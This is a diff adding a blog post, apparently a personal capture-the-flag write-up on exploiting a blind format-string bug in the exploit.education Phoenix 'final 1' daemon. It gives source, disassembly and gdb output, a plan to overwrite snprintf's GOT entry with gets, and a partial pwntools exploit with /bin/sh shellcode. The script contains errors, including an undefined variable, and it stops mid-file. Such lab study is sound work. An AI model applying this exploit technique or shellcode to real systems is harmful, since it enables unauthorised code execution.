@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html class="default_colors_property">
+  <base href="/home/tabacco/tech/coding/web/execius.github.io/" target="">
+  <head>
+    <link rel="stylesheet" href="rsc/css/post.css">
+    <link rel="stylesheet" href="rsc/css/code.css">
+    <meta name="description" content="can you do a format string attack even if you cannot see the leak? let's see">
+    <title>Execius : phoenix final 1 - blind format string</title>
+          
+    <link rel="stylesheet" href="rsc/css/mainstyle.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+    <meta charset="UTF-8">
+    <meta name="keywords" content="binary exploitation, hacking, pwn, reverse engineering , Execius">
+    <meta name="author" content="Execius">
+
+
+  </head>
+
+  <body>
+          
+    <nav class="bar navbar">
+
+      <div class="home_logo bar_item">
+        <a class="button logo_text"  href="index.html" >Execius</a>
+      </div>
+
+      <div class="categories bar_item">
+        <a class="button" href="./rsc/html/topics/index.html"><i class="fa-solid fa-folder"></i>Topics</a>
+        <a class="button" href="rsc/html/feed/index.html"><i class="fa-solid fa-square-rss"></i>Feed</a>
+        <a class="button" href="rsc/html/resources/index.html"><i class="fa-solid fa-book"></i> resources </a>
+      </div>
+
+    </nav>
+
+
+    <div class="layout">
+      <main class="content">
+
+        <div class="post">
+          <ul>
+<li>I have been trying to pwn the challenge final 1 for nearly a day and a half now and i don't seem to have made any progress , so i will write what i find here so i can hopefully link the dots </li>
+</ul>
+<h1>context</h1>
+<ul>
+<li>we will be working on the 32 bit version </li>
+</ul>
+<h1>analysis</h1>
+<ul>
+<li>the first thing i did was read the source code:</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;arpa/inet.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;err.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/socket.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;syslog.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+
+<span class="cp">#define BANNER \</span>
+<span class="cp">  &quot;Welcome to &quot; LEVELNAME &quot;, brought to you by https:</span><span class="c1">//exploit.education&quot;</span>
+
+<span class="kt">char</span><span class="w"> </span><span class="n">username</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+<span class="kt">char</span><span class="w"> </span><span class="n">hostname</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+<span class="kt">FILE</span><span class="w"> </span><span class="o">*</span><span class="n">output</span><span class="p">;</span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">logit</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">pw</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">2048</span><span class="p">];</span>
+
+<span class="w">  </span><span class="n">snprintf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span><span class="w"> </span><span class="s">&quot;Login from %s as [%s] with password [%s]</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="n">hostname</span><span class="p">,</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">pw</span><span class="p">);</span>
+
+<span class="w">  </span><span class="n">fprintf</span><span class="p">(</span><span class="n">output</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">trim</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">str</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">q</span><span class="p">;</span>
+
+<span class="w">  </span><span class="n">q</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strchr</span><span class="p">(</span><span class="n">str</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;\r&#39;</span><span class="p">);</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">q</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="n">q</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">  </span><span class="n">q</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strchr</span><span class="p">(</span><span class="n">str</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;\n&#39;</span><span class="p">);</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">q</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="n">q</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">parser</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">line</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[final1] $ &quot;</span><span class="p">);</span>
+
+<span class="w">  </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">stdin</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">trim</span><span class="p">(</span><span class="n">line</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;username &quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">9</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">strcpy</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">line</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">9</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;login &quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">6</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">username</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;invalid protocol</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">      </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">logit</span><span class="p">(</span><span class="n">line</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">6</span><span class="p">);</span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;login failed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">      </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[final1] $ &quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="n">testing</span><span class="p">;</span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">getipport</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="kt">socklen_t</span><span class="w"> </span><span class="n">l</span><span class="p">;</span>
+<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">sockaddr_in</span><span class="w"> </span><span class="n">sin</span><span class="p">;</span>
+
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">testing</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">strcpy</span><span class="p">(</span><span class="n">hostname</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;testing:12121&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="k">return</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="n">l</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">sockaddr_in</span><span class="p">);</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">getpeername</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">l</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">-1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;you don&#39;t exist&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="n">sprintf</span><span class="p">(</span><span class="n">hostname</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;%s:%d&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">inet_ntoa</span><span class="p">(</span><span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">),</span><span class="w"> </span><span class="n">ntohs</span><span class="p">(</span><span class="n">sin</span><span class="p">.</span><span class="n">sin_port</span><span class="p">));</span>
+<span class="p">}</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">envp</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">argc</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">testing</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="w"> </span><span class="s">&quot;--test&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">output</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">stderr</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">output</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fopen</span><span class="p">(</span><span class="s">&quot;/dev/null&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;w&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">output</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;fopen(/dev/null)&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">_IONBF</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
+<span class="w">  </span><span class="n">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">_IONBF</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
+
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">BANNER</span><span class="p">);</span>
+
+<span class="w">  </span><span class="n">getipport</span><span class="p">();</span>
+<span class="w">  </span><span class="n">parser</span><span class="p">();</span>
+
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<ul>
+<li>it is obvious that the vulnerability is in the function logit , exacly in the call to <code>fprintf</code> , because we control username and pw and by extension part of buff .</li>
+<li>the thing that is both fun and frustrating here is that all the information that we could read by placing format specifiers (eg. %p) in buff is redirected to <code>output</code> which points to <code>/dev/null</code> , our data and with it our sweet feedback goes to oblivion , this is what is meant with the word blind .</li>
+<li>the text before username and pw that includes the hostname can cause alignement errors, however , a simple calculation tell me that putting a single space before the data in username makes whatever addresses put after it in perfect alignment  when things are  copied into buff.</li>
+<li>also for some context , here is the disassembly of <code>logit</code>:</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="n">push</span><span class="w">   </span><span class="n">ebp</span>
+<span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
+<span class="w">    </span><span class="n">sub</span><span class="w">    </span><span class="n">esp</span><span class="p">,</span><span class="mh">0x808</span>
+<span class="w">    </span><span class="n">sub</span><span class="w">    </span><span class="n">esp</span><span class="p">,</span><span class="mh">0x8</span>
+<span class="w">    </span><span class="n">push</span><span class="w">   </span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="o">[</span><span class="n">ebp+0x8</span><span class="o">]</span>
+<span class="w">    </span><span class="n">push</span><span class="w">   </span><span class="mh">0x8049ee0</span>
+<span class="w">    </span><span class="n">push</span><span class="w">   </span><span class="mh">0x8049f80</span>
+<span class="w">    </span><span class="n">push</span><span class="w">   </span><span class="mh">0x8048b40</span>
+<span class="w">    </span><span class="n">push</span><span class="w">   </span><span class="mh">0x800</span>
+<span class="w">    </span><span class="n">lea</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="o">[</span><span class="n">ebp-0x808</span><span class="o">]</span>
+<span class="w">    </span><span class="n">push</span><span class="w">   </span><span class="n">eax</span>
+<span class="w">    </span><span class="k">call</span><span class="w">   </span><span class="mh">0x8048560</span><span class="w"> </span><span class="o">&lt;</span><span class="n">snprintf</span><span class="nv">@plt</span><span class="o">&gt;</span>
+<span class="w">    </span><span class="k">add</span><span class="w">    </span><span class="n">esp</span><span class="p">,</span><span class="mh">0x20</span>
+<span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="nl">ds</span><span class="p">:</span><span class="mh">0x8049f60</span>
+<span class="w">    </span><span class="n">sub</span><span class="w">    </span><span class="n">esp</span><span class="p">,</span><span class="mh">0x8</span>
+<span class="w">    </span><span class="n">lea</span><span class="w">    </span><span class="n">edx</span><span class="p">,</span><span class="o">[</span><span class="n">ebp-0x808</span><span class="o">]</span>
+<span class="w">    </span><span class="n">push</span><span class="w">   </span><span class="n">edx</span>
+<span class="w">    </span><span class="n">push</span><span class="w">   </span><span class="n">eax</span>
+<span class="w">    </span><span class="k">call</span><span class="w">   </span><span class="mh">0x80485a0</span><span class="w"> </span><span class="o">&lt;</span><span class="n">fprintf</span><span class="nv">@plt</span><span class="o">&gt;</span>
+<span class="w">    </span><span class="k">add</span><span class="w">    </span><span class="n">esp</span><span class="p">,</span><span class="mh">0x10</span>
+<span class="w">    </span><span class="n">nop</span>
+<span class="w">    </span><span class="n">leave</span><span class="w">  </span>
+<span class="w">    </span><span class="n">ret</span><span class="w">    </span>
+</code></pre></div>
+
+<h2>planning the exploit</h2>
+<ul>
+<li>the idea behind this exploit was polished by the circumstances of this challenge , examining the core dump i found i can do arbitrary write to any  memory  , but the number that i can write with <code>%n</code> is itself limited since i can only put around 250 characters in the login and username variables, so if i am doing partial writes to an address , the range i can work with is something between 20 and 250 , so searching in  the core dumps i had an idea that thrilled me is someone who is just starting in this , what if i could create another , more powerful , easy to exploit vulnerability using my kind of hard format string one ? </li>
+<li>now just follow with me , we know that the first argument given to the function <code>snprintf</code> is <code>buf</code> , so if we can somehow replace the got entry of <code>snprintf</code> with the address of <code>gets</code> , i can write whatever i want to buff with no bounds , a classic stack based buffer overflow !</li>
+<li>examining with <code>gdb</code> :
+<strong><em>notice</em></strong> : set a break point and runt he program with --test , the addresses of the functions change at runtime .</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="p">(</span><span class="n">gdb</span><span class="p">)</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="n">functions</span><span class="w"> </span><span class="n">snprintf</span>
+<span class="n">Non</span><span class="o">-</span><span class="n">debugging</span><span class="w"> </span><span class="nl">symbols</span><span class="p">:</span>
+<span class="mh">0x08048560</span><span class="w">  </span><span class="n">snprintf</span><span class="nv">@plt</span>
+
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span><span class="w"> </span><span class="n">disassemble</span><span class="w"> </span><span class="mh">0x08048560</span>
+<span class="k">Dump</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">assembler</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="n">snprintf</span><span class="nv">@plt</span><span class="err">:</span>
+<span class="w">   </span><span class="mh">0x08048560</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="err">:</span><span class="w"> </span><span class="n">jmp</span><span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="nl">ds</span><span class="p">:</span><span class="mh">0x8049e4c</span>
+
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span><span class="w"> </span><span class="n">x</span><span class="o">/</span><span class="n">w</span><span class="w"> </span><span class="mh">0x8049e4c</span>
+<span class="mh">0x8049e4c</span><span class="w"> </span><span class="o">&lt;</span><span class="n">snprintf</span><span class="nv">@got</span><span class="p">.</span><span class="n">plt</span><span class="o">&gt;</span><span class="err">:</span><span class="w">   </span><span class="mh">0xf7fb8b69</span>
+</code></pre></div>
+
+<ul>
+<li>the address of the function <code>snprintf</code> is <code>0xf7fb8b69</code></li>
+<li>and to get the address of <code>gets</code>:</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="p">(</span><span class="n">gdb</span><span class="p">)</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="n">functions</span><span class="w"> </span><span class="n">gets</span><span class="w"> </span>
+<span class="n">All</span><span class="w"> </span><span class="n">functions</span><span class="w"> </span><span class="n">matching</span><span class="w"> </span><span class="n">regular</span><span class="w"> </span><span class="n">expression</span><span class="w"> </span><span class="s">&quot;gets&quot;</span><span class="o">:</span>
+
+<span class="n">Non</span><span class="o">-</span><span class="n">debugging</span><span class="w"> </span><span class="nl">symbols:</span>
+<span class="p">...</span>
+<span class="p">...</span>
+<span class="mh">0</span><span class="n">xf7fb7db3</span><span class="w">  </span><span class="n">gets</span>
+<span class="p">...</span>
+<span class="p">...</span>
+</code></pre></div>
+
+<ul>
+<li>
+<p>i did not do the same diging process because this is not in the <code>plt</code> , since it is not used in the code , for more see <a href="procedure-linkage-table-plt.html">plt</a> , so the address of gets is <code>0xf7fb7db3</code>, and the address of <code>snprintf</code> is <code>0xf7fb8b69</code> , notice the first two bytes are identical ? and more good news , in the bytes that are different , the number we wanna write to the address of <code>snprintf</code> to make it the same is <code>gets</code> address are <code>7d</code> and <code>b3</code> , in decimal 125 and 179  , both in our writable numbers range ! , in theory this is 100% working . </p>
+</li>
+<li>
+<p>now  that we found a good approach , let's lay down our plan, first we will solve our  alignment issue , remember ,what we wanna write in the stack the <strong>address of the address</strong> of <code>snprintf</code> , because  the format specifier <code>%n</code> writes to the memory <strong>in</strong> the address it find so on the stack , not to the stack itself , many confuse this , it simply writes the number of character written so far in the location pointed to by the argument given to it , which is a pointer laying in the stack , but the catch is , the argument is the stack in 32 bit programs should be aligned to 4 bytes , meaning they reside in a stack offset that is a multiple of 4 ,the reason for this is that due to <a href="the-stack-and-calling-conventions-in-x86.html">calling conventions</a> ,   <code>variadic</code> functions like <code>snprintf</code> read from the top of the stack of the caller function (the address in <code>esp</code>), and increase by 4 to find the next argument , when you want the nth argument , it simply access the address <code>esp</code>+n*4 ,so if our address that we put in the stack to modify its content is not placed right , the function wont be able to interpret it . </p>
+</li>
+<li>
+<p>according to the disassembly of logit , this is the stack layou (yes buf is 2056 bytes in the assembly as opposed to 2048 in the code, this will be important in the exploit):</p>
+</li>
+</ul>
+<div class="codehilite"><pre><span></span><code>+----------------------------+  &lt;- Lower memory (stack grows down)
+| Return Address (ret)      |  
++----------------------------+
+| Saved EBP                 |
++----------------------------+
+| Buf[2056]              |
+| (2056 bytes)              |
+| ...                       |
++----------------------------+
+| Blank / Padding (8 bytes) |
+|                           |
++----------------------------+
+| Address of Buf (4B)    |
++----------------------------+
+| Pointer to Output (4B)    |
++----------------------------+  &lt;- Higher memory
+</code></pre></div>
+
+<ul>
+<li>the <code>snprintf</code> reads from the position above the buffer address , meaning if we give it <code>%lf %lf</code> it will read from the blank 8 bytes , then , 8 bytes from <code>buf</code> </li>
+<li>our address that we wanna put there is in the variable username , which is written to <code>buf</code> with this <code>"Login from %s as [%s] with password [%s]\n",hostname, username, pw);</code> , we will assume that <code>hostname</code> is the largest possible length i could take , which is the same length as 255.255.255.255:65535 (if it does not, we pad it to be the same length in the script) , this as done so we dont have unknown variation between machines</li>
+<li>a side note : what we are writing to the stack is the address of the address of <code>snprintf</code> , the got entry , that's why the variables <code>snprintf</code> and <code>snprintf 2</code> are not he same as the address of <code>snprintf</code> , one <strong>points to</strong> the first byte in the address and the other to the second.</li>
+</ul>
+<h1>the exploit</h1>
+<ul>
+<li>after some long trial and error (that any binary exploiter should experience), i figured out that after the padding of the address, we should also add 3 character, and then put the address of <code>snprintf</code> , after that , the format <code>%lf%lf%lf%lf%x%x%x%x</code> , puts us right on the first bit of the address , some playing around to print the exact number of character is necessary , also we will print to the address of <code>snprintf</code> +1 , remember that we got to change the first two bytes (first because of the <a href="endianness.html">endianness</a>, and after a successful address modification the rest is a straight forward stack buffer overflow, after that i was left with this very not ugly python exploit :</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="c1">#/usr/bin/python</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1">#phase 1 , replacing fgets with gets using the format string</span>
+
+<span class="c1">#connection to the daemon and setting the padding </span>
+<span class="c1">#for hostname that we dicussed earlier</span>
+<span class="n">targetsocket</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">targetsocket</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span><span class="mi">64014</span><span class="p">))</span>
+<span class="n">exploited</span> <span class="o">=</span> <span class="n">remote</span><span class="o">.</span><span class="n">fromsocket</span><span class="p">(</span><span class="n">targetsocket</span><span class="p">)</span>
+<span class="p">(</span><span class="n">myaddr</span><span class="p">,</span><span class="n">myport</span><span class="p">)</span> <span class="o">=</span> <span class="n">targetsocket</span><span class="o">.</span><span class="n">getsockname</span><span class="p">()</span>
+<span class="n">hostname</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">myaddr</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;:&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">myport</span><span class="p">)</span>
+<span class="n">padding</span> <span class="o">=</span> <span class="mi">21</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">hostname</span><span class="p">)</span> 
+
+
+<span class="n">snprintf</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08049e4c</span><span class="p">)</span>
+<span class="n">snprintf</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08049e4c</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">space</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39; &#39;</span>
+
+<span class="c1">#this gets us to the exact location we put the adresses</span>
+<span class="n">readtoplace</span> <span class="o">=</span><span class="sa">b</span><span class="s2">&quot;</span><span class="si">%lf%lf%lf%lf%x%x%x%x</span><span class="s2">&quot;</span>
+<span class="c1">#this writes the amount of characters written so far at </span>
+<span class="c1">#the first byte in the address at the location we are at </span>
+<span class="n">writecmd</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;%hhn&quot;</span>
+
+<span class="n">username</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;username &quot;</span><span class="o">+</span><span class="p">(</span><span class="n">padding</span><span class="o">+</span><span class="mi">3</span><span class="p">)</span><span class="o">*</span><span class="s1">&#39;g&#39;</span><span class="o">+</span><span class="n">snprintf2</span><span class="o">+</span><span class="n">snprintf</span><span class="o">+</span><span class="mi">9</span><span class="o">*</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">+</span><span class="n">readtoplace</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
+<span class="n">login</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;login &quot;</span> <span class="o">+</span><span class="n">writecmd</span><span class="o">+</span><span class="mi">54</span><span class="o">*</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">+</span><span class="n">writecmd</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span> 
+
+<span class="k">try</span><span class="p">:</span>
+
+    <span class="n">exploited</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
+    <span class="n">exploited</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;[final1] $ &quot;</span><span class="p">)</span>
+    <span class="n">exploited</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">login</span><span class="p">)</span>
+    <span class="n">exploited</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;[final1] $ &quot;</span><span class="p">)</span>
+
+<span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+    <span class="n">exit</span><span class="p">()</span>
+
+
+<span class="c1">#phase 2 , the stack buffer overflow with</span>
+
+<span class="c1">#now that we replace the function snprintf with gets</span>
+<span class="c1">#we will give some bogus username and login just to </span>
+<span class="c1">#execute the function logit and get the gets to buf</span>
+
+<span class="c1">#resending credentials so we can get to gets</span>
+<span class="c1">#(snprintf previously)</span>
+
+<span class="n">exploited</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
+<span class="n">exploited</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;[final1] $ &quot;</span><span class="p">)</span>
+<span class="n">exploited</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">login</span><span class="p">)</span>
+<span class="n">exploited</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;[final1] $ &quot;</span><span class="p">)</span>
+
+<span class="c1">#buf is 2048 in the c code but 2056 in the asm</span>
+<span class="n">bufsize</span> <span class="o">=</span> <span class="mi">2056</span>
+<span class="c1">#bufaddr = p32(0xf7ffb660)</span>
+<span class="n">bufaddr</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xffffd490</span><span class="p">)</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80</span><span class="s2">&quot;</span>
